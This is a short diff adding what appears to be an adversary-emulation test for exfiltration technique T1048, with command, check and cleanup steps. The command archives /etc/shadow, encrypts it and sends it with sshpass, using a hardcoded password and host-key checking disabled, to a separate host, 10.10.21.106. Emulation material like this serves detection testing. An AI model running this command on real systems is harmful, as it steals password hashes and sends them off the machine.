@@ -1,0 +1,7 @@
+Elevation Required;
+#command
+tar czvf - /etc/shadow | openssl des3 -salt -pass pass:"20010404" | sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'cat > /tmp/T1048.tar.gz.enc'
+#check
+sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'file /tmp/T1048.tar.gz.enc'
+#cleanup
+sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'rm /tmp/T1048.tar.gz.enc'
